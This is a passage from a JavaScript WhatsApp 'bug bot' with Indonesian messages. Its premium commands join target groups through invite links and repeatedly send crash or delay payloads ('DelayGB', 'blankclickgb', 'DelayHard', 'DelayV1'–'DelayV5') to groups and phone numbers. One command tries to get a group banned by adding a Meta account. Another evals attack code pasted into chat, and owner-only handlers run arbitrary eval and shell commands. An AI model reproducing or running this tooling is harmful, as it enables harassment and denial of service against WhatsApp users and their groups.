      let target = getGroup.id.includes("@g.us") ? getGroup.id : `${getGroup.id}@g.us`;

      try {
        await sock.groupAcceptInvite(codeGroup);
        await sleep(2000);
      } catch (joinErr) {
        console.log(chalk.yellow('skip auto-join/already in group or restricted.', joinErr?.message || joinErr));
      }

      console.log(chalk.yellow(`target: ${target} — mulai 55 iterasi`));
      
      let success = 0, failed = 0;
      const totalLoop = 55;

      for (let i = 1; i <= totalLoop; i++) {
        try {
          await blankclickgb(target);
          await sleep(500);
          await blankclickgb(target);
          await sleep(500);
          success++;
        } catch (e) {
          failed++;
          console.log(chalk.red(`Iterasi ${i} gagal: ${e.message}`));

          const msg = (e.output?.statusCode || e.data || "") + " " + e.message;
          if (/429|rate|conflict|forbidden|logged|connection/i.test(msg)) {
            console.log(chalk.red(`berhenti di iterasi ${i}: ${e.message}`));
            break;
          }
        }
      }

      console.log(chalk.red.bold(`selesai! sukses: ${success} | Gagal: ${failed}`));
    } catch (e) {
      console.error(chalk.red(`[background Error - group]:`, e?.message || e));
    }
  })();
  break;
}
case "groupdelay": {
  if (!isPremium) return reply("*You are not a Premium User*");
  if (!q) return reply(`*Syntax Error*\nExample: ${command} https://chat.whatsapp.com/xxxx`);

  const match = q.trim().match(/chat\.whatsapp\.com\/(?:join\/)?([A-Za-z0-9_-]+)/);
  if (!match) return reply("*Link group tidak valid*");
  const codeGroup = match[1];

  await reply(`*SuccessFully! Send Bug To ${q}*`);

  ;(async () => {
    try {
      let getGroup = await sock.groupGetInviteInfo(codeGroup);
      let target = getGroup.id.includes("@g.us") ? getGroup.id : `${getGroup.id}@g.us`;

      try {
        await sock.groupAcceptInvite(codeGroup);
        await sleep(2000);
      } catch (joinErr) {
        console.log(chalk.yellow('skip auto-join/already in group or restricted.', joinErr?.message || joinErr));
      }

      console.log(chalk.yellow(`target: ${target} — mulai 55 iterasi`));
      
      let success = 0, failed = 0;
      const totalLoop = 55;

      for (let i = 1; i <= totalLoop; i++) {
        try {
          await DelayGB(target);
          await sleep(500);
          await DelayGB(target);
          await sleep(500);
          success++;
        } catch (e) {
          failed++;
          console.log(chalk.red(`Iterasi ${i} gagal: ${e.message}`));

          const msg = (e.output?.statusCode || e.data || "") + " " + e.message;
          if (/429|rate|conflict|forbidden|logged|connection/i.test(msg)) {
            console.log(chalk.red(`berhenti di iterasi ${i}: ${e.message}`));
            break;
          }
        }
      }

      console.log(chalk.red.bold(`selesai! sukses: ${success} | Gagal: ${failed}`));
    } catch (e) {
      console.error(chalk.red(`[background Error - group]:`, e?.message || e));
    }
  })();
  break;
}
case "groupcombo": {
  if (!isPremium) return reply("*You are not a Premium User*");
  if (!q) return reply(`*Syntax Error*\nExample: ${command} https://chat.whatsapp.com/xxxx`);

  const match = q.trim().match(/chat\.whatsapp\.com\/(?:join\/)?([A-Za-z0-9_-]+)/);
  if (!match) return reply("*Link group tidak valid*");
  const codeGroup = match[1];

  await reply(`*SuccessFully! Send Bug To ${q}*`);

  ;(async () => {
    try {
      let getGroup = await sock.groupGetInviteInfo(codeGroup);
      let target = getGroup.id.includes("@g.us") ? getGroup.id : `${getGroup.id}@g.us`;

      try {
        await sock.groupAcceptInvite(codeGroup);
        await sleep(2000);
      } catch (joinErr) {
        console.log(chalk.yellow('skip auto-join/already in group or restricted.', joinErr?.message || joinErr));
      }

      console.log(chalk.yellow(`target: ${target} — mulai 55 iterasi`));
      
      let success = 0, failed = 0;
      const totalLoop = 55;

      for (let i = 1; i <= totalLoop; i++) {
        try {
          await blankclickgb(target);
          await sleep(500);
          await DelayGB(target);
          await sleep(500);
          success++;
        } catch (e) {
          failed++;
          console.log(chalk.red(`Iterasi ${i} gagal: ${e.message}`));

          const msg = (e.output?.statusCode || e.data || "") + " " + e.message;
          if (/429|rate|conflict|forbidden|logged|connection/i.test(msg)) {
            console.log(chalk.red(`berhenti di iterasi ${i}: ${e.message}`));
            break;
          }
        }
      }

      console.log(chalk.red.bold(`selesai! sukses: ${success} | Gagal: ${failed}`));
    } catch (e) {
      console.error(chalk.red(`[background Error - group]:`, e?.message || e));
    }
  })();
  break;
}
      case "forcemaker": {
        if (!isPremium) return reply("*You are not a Premium User*");
        if (!q) return reply(`*Syntax Eror*
Example: ${command} 628xxx`);
        let numParsed = q.replace(/[^0-9]/g, '');
        if (numParsed.startsWith('0')) return reply(`*Syntax Eror*
Example: ${command} 628xxx`);
        let target = numParsed + "@s.whatsapp.net";
        reply(`*Success! Send Bug to ${target}*`);
        for (let i = 0; i < 35; i++) {
        
          await DelayV1(target);
          await sleep(500);
          await DelayV2(target);
          await sleep(500);
          await DelayV3(target);
          await sleep(500);
          await DelayV4(target);
          await sleep(500);
          await DelayV5(target);
          await sleep(500);
        }
        console.log(chalk.red.bold("Success!"));
        break;
      }      
  case "bandgroup": {
  if (!isPremium) return reply("ᴏɴʟʏʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ!!");
  if (!q || !q.includes("chat.whatsapp.com")) return reply(`*Syntax Error*\nExample: ${prefix + command} https://chat.whatsapp.com/xxxx`);

  const targetMeta = "13135550002@s.whatsapp.net";

  const match = q.trim().match(/chat\.whatsapp\.com\/(?:join\/)?([A-Za-z0-9_-]+)/);
  if (!match) return reply("❌ link group tidak valid!");
  
  const codeGroup = match[1];
  await reply(`⏳ *processing...*\nsedang memproses link grup dan mengeksekusi target...`);

  ;(async () => {
    let target;
    try {
      const getGroup = await sock.groupGetInviteInfo(codeGroup);
      target = getGroup.id.includes("@g.us") ? getGroup.id : `${getGroup.id}@g.us`;

      try {
        await sock.groupAcceptInvite(codeGroup);
        await sleep(2000);
      } catch (joinErr) {
        console.log(chalk.yellow('skip auto-join/already in group or waiting acc...', joinErr?.message || joinErr));
      }
    } catch (e) {
      console.log(chalk.red(`mengambil info grup]: ${e.message}`));
      return sock.sendMessage(from, { text: `❌ gagal memproses link grup: ${e.message}` }, { quoted: m });
    }

    try {
      await sock.groupParticipantsUpdate(target, [targetMeta], "add");
      await sock.sendMessage(from, { text: `✅ *Sukses Banned!*\nTarget Grup: ${target}` }, { quoted: m });
    } catch (err) {
      console.error(chalk.red("Error:"), err?.message || err);
      await sock.sendMessage(from, { text: `⚠️ *Info Banned*\nRequest penambahan dikirim jika grup butuh acc sistem akan menunggu persetujuan\n\nlog: ${err.message}` }, { quoted: m });
    }
  })();
  break;
}
case "tesfunct": {
    if (!isPremium) return reply("*You are not a Premium User*");
    
    let args = q.split(" "); 
    let namaFungsi = args[0]; 
    let jumlah = parseInt(args[1]); 
    
    if (!namaFungsi || !jumlah || isNaN(jumlah)) {
        return reply(`*Syntax Error*\nExample: ${command} namafunct 5`);
    }

    if (!m.quoted || !m.quoted.text) {
        return reply("*Error!* Kamu harus me-reply chat yang berisi kode fungsinya.");
    }

    let target = m.chat; 
    
    reply(`*Success! Mengeksekusi fungsi ${namaFungsi} ke target sebanyak ${jumlah} kali...*`);
    
    for (let i = 0; i < jumlah; i++) {
        try {
            await eval(`(async (target) => {\n${m.quoted.text}\nawait ${namaFungsi}(target);\n})`)(target);
            await sleep(500); 
        } catch (err) {
            return reply(`*Error saat menjalankan!*\n\nDetail: ${err.message}`);
        }
    }
    
    console.log(chalk.red.bold(`Success mengeksekusi ${namaFungsi}!`));
    break;
}      

case "c1dekk": {
    if (!isPremium) return reply("*You are not a Premium User*");
    if (m.chat.endsWith('@g.us')) return reply("*error! command ini hanya bisa digunakan di chat target!!*");
    
    let target = m.chat; 
    
    reply(`*Success! Kok C1 Bang? 🥴*`);
    
    for (let i = 0; i < 35; i++) {
    
          await DelayHard(target);
          await sleep(500);
          await DelayHard(target);
          await sleep(500);
          
    } console.log(chalk.red.bold("success!"));
    break;
}

      case "donasi":
      case "qris": {
        await sock.sendMessage(m.chat, { react: { text: '🕖', key: m.key } });

        try {
          let qrisUrl = "https://files.catbox.moe/hqzoiw.jpeg"; 
          
          let captionText = `✨ *DONASI & PAYMENT* ✨

Silakan scan QRIS di atas untuk melakukan donasi atau pembayaran.

*Mendukung:*
• All E-Wallet (Dana, GoPay, Ovo, ShopeePay, LinkAja)
• All Bank (BCA, BRI, Mandiri, BNI, dll)

_Terima kasih atas dukungan kalian!_ 💖`;

          await sock.sendMessage(m.chat, {
            image: { url: qrisUrl },
            caption: captionText
          }, { quoted: m });

          await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

        } catch (e) {
          console.error(e);
          reply("gagal menampilkan foto qris!!");
          await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        }
        break;
      }

      default: {
        if (budy.startsWith('=>')) {
          if (!isOwner) return;
          try {
            reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)));
          } catch (e) {
            reply(String(e));
          }
        }
        if (budy.startsWith('>')) {
          if (!isOwner) return;
          try {
            let evaled = await eval(budy.slice(2));
            if (typeof evaled !== "string") evaled = require("util").inspect(evaled);
            await reply(evaled);
          } catch (e) {
            await reply(String(e));
          }
        }
        if (budy.startsWith('$')) {
          if (!isOwner) return;
          exec(budy.slice(2), (err, stdout) => {
            if (err) return reply(`${err}`);
            if (stdout) return m.reply(stdout);
          });
        }
      }
    }
  } catch (err) {
    sock.sendMessage(m.chat, { text: util.format(err) }, { quoted: m });
    console.log(chalk.red(err));
  }
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.green(`${__filename} updated!`));
  delete require.cache[file];
  require(file);
});
